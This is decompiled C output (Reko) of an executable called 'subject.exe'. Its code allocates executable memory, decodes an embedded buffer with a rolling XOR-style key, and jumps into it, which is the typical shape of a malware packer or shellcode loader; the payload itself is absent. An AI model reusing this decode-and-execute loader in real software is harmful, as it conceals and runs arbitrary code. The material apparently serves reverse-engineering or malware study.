// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004020B8: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax_10 = SwitchDesktop(dwArg04);
	if (eax_10 == 0x00)
		eax_10 = fn004020ED((byte) GetPrivateProfileIntA(fp - 0x08, fp - 0x08, 0xF5, fp - 0x08));
	return eax_10;
}

// 004020ED: Register word32 fn004020ED(Register byte bl)
word32 fn004020ED(byte bl)
{
	word32 ecx_25 = 0x01E3;
	word32 * esp_26 = fp - 0x14;
	union Eq_36 * esi_29 = (union Eq_36 *) 0x00014A8D;
	Eq_38 edi_30 = VirtualAlloc(0x00, 84440, 0x3000, 0x40);
	uint32 edx_35 = DPB(0x29E95BEB, bl + ~0x14, 0);
	word32 ebp_102 = 0x00;
l00402144:
	uint32 * esp_48 = esp_26 - 0x04;
	*esp_48 = edx_35;
	*(esp_48 - 0x04) = ecx_25;
	word32 ecx_57 = *(esp_48 - 0x04);
	*edi_30 = (word32) *edi_30 + (byte) ((char *) (*esi_29) + *esp_48);
	uint32 edx_61 = *esp_48;
	esp_26 = esp_48 + 0x01;
	esi_29 = (union Eq_36 *) ((char *) esi_29 + 0x01);
	edi_30 = edi_30 + 0x01;
	ebp_102 = ebp_102 + 0x01;
	uint32 edx_109 = edx_61 >> 0x08;
	byte dl_100 = (byte) (edx_61 >> 0x08);
	if (0x04 == ebp_102)
	{
		edx_109 = 0x29E95BEB;
		dl_100 = ~0x14;
		ebp_102 = 0x00;
	}
	do
	{
		byte dl_84 = dl_100 + bl;
		word32 ecx_86 = ecx_57 - 237239;
		edx_35 = DPB(edx_109, dl_84, 0);
		ecx_25 = ecx_86 + 237238;
		if (ecx_86 != 237238)
			goto l00402144;
		<anonymous> * eax_91 = *esp_26;
		word32 eax_94;
		byte SCZO_95;
		byte SZO_103;
		byte C_104;
		byte Z_105;
		eax_91();
	} while (false);
	return eax_94;
}

